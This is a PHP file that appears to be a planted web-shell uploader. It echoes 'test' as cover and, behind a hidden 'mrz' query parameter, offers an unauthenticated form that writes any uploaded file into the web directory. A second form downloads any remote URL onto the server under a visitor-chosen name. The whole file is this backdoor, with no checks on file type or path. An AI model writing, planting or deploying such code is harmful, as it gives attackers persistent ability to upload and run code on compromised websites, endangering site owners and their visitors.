<?php
echo 'test';
if ( isset($_GET['mrz']) )
{
	echo '<form action="" method="post" enctype="multipart/form-data" name="b4b4" id="b4b4">';
	echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
	echo '<br><br>';

	echo '<form action="" method="post">';
	echo 'Remote URL: <input type="text" name="remote_url" size="70" placeholder="https://example.com/file.zip"><br>';
	echo 'Save as: <input type="text" name="save_as" size="40" placeholder="filename.zip"><br><br>';
	echo '<input name="_remote" type="submit" value="Download Remote">';
	echo '</form><br>';

	echo '<a href="#">Hello Dady</a><br><br>';

	if( $_POST['_upl'] == "Upload" ) {
		if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { 
			echo '<b>Done</b><br><br><a href="./' . $_FILES['file']['name'] . '">' . $_FILES['file']['name'] . '</a>'; 
		}
		else { echo '<b>Not Upload File !</b><br><br>'; }
	}

	if( isset($_POST['_remote']) && !empty($_POST['remote_url']) ) {
		$url = trim($_POST['remote_url']);
		$save_as = !empty($_POST['save_as']) ? trim($_POST['save_as']) : basename($url);
		
		if(preg_match('/^https?:\/\//i', $url)) {
			$content = @file_get_contents($url);
			if($content !== false) {
				if(@file_put_contents($save_as, $content)) {
					echo '<b>Remote Download Done!</b><br><br><a href="./' . htmlspecialchars($save_as) . '">' . htmlspecialchars($save_as) . '</a>';
				} else {
					echo '<b>Failed to save file!</b><br>';
				}
			} else {
				echo '<b>Failed to download!</b><br>';
			}
		} else {
			echo '<b>Invalid URL!</b><br>';
		}
	}

exit;
}
?>
